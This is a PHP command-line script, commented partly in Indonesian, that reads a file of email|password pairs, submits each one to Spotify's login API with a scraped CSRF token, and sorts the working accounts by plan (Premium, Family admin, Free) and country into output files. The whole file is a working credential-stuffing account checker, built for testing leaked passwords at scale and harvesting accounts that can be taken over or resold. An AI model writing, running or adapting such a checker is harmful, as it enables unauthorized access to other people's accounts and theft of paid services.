<?php
/*
* how to use :
* $ > php account.php list.txt
* 
* list email :
* email|pass
*/
error_reporting(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 300000000);
$live = 0;
$die = 0;

$i = 0;
$listcode = $argv[1];
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
echo "Ngecek $count akun, tunggu bos!\r\n";
while($i < $count) {
	$status = "Unkown";
	$filename = "live.txt";
	$percentage = round(($i+1)/$count*100,2);
	
	$akun = explode("|", $code[$i]); 
	$email = urlencode(trim($akun[0]));
	$pass = trim($akun[1]);

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_TIMEOUT, 600);
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_VERBOSE, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language: en-US,en;q=0.5",
	));
	curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/id-ID/login");
	$res = curl_exec($ch);
	preg_match_all("|Set-Cookie: csrf_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $res, $csrf);
	$csrf = trim($csrf[1][0]);

	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
		"Accept: application/json, text/plain, */*",
		"Accept-Language: en-US,en;q=0.5",
		"Content-Type: application/x-www-form-urlencoded",
		"Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=$csrf; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
	));
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$email&password=$pass&csrf_token=$csrf");
	$res = curl_exec($ch);
	$res = json_decode($res);
	$email = urldecode($email);
	if(isset($res->error) && trim($res->error) == "errorInvalidCredentials" ) {
		echo "$percentage %\t : DIE => $email | $pass\r\n";
		$die++;
	} elseif(isset($res->displayName) || stripos($json_encode($res), "displayName")) {
		curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/id/account/overview/");
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language: en-US,en;q=0.5",
		));
		$res = curl_exec($ch);
		preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $res, $premium);
		preg_match_all('|<h3 class="product-name">(.*)</h3>|', $res, $free);
		preg_match_all('|<p class="form-control-static" id="card-profile-country">(.*)</p></div><div class="form-group">|', $res, $country);
		if(trim($premium[1][0]) == "Spotify Premium") { 
			$status = "Premium"; 
			$filename = "live-premium.txt";
		} elseif(trim($premium[1][0]) == "Premium for Family") {
			$status = "Admin Family";
			$filename = "live-adminfamily.txt";
		} elseif(trim($free[1][0]) == "Spotify Free") {
			$status = "Free";
			$filename = "live-free.txt";
		}
		$country = $country[1][0];
		echo "$percentage %\t : LIVE => $status | $email | $pass | $country\r\n";
		$fopen = fopen($filename, "a+");
		$fwrite = fwrite($fopen, "Country : $country|$email|$pass\r\n");
		fclose($fopen);
		$live++;
	} else {
		echo "$percentage %\t : UNKNOWN => $email | $pass\r\n";
	}
	curl_close($ch);
	$i++;
}
echo "\r\nDone | Live : $live | Die : $die | Total : $count";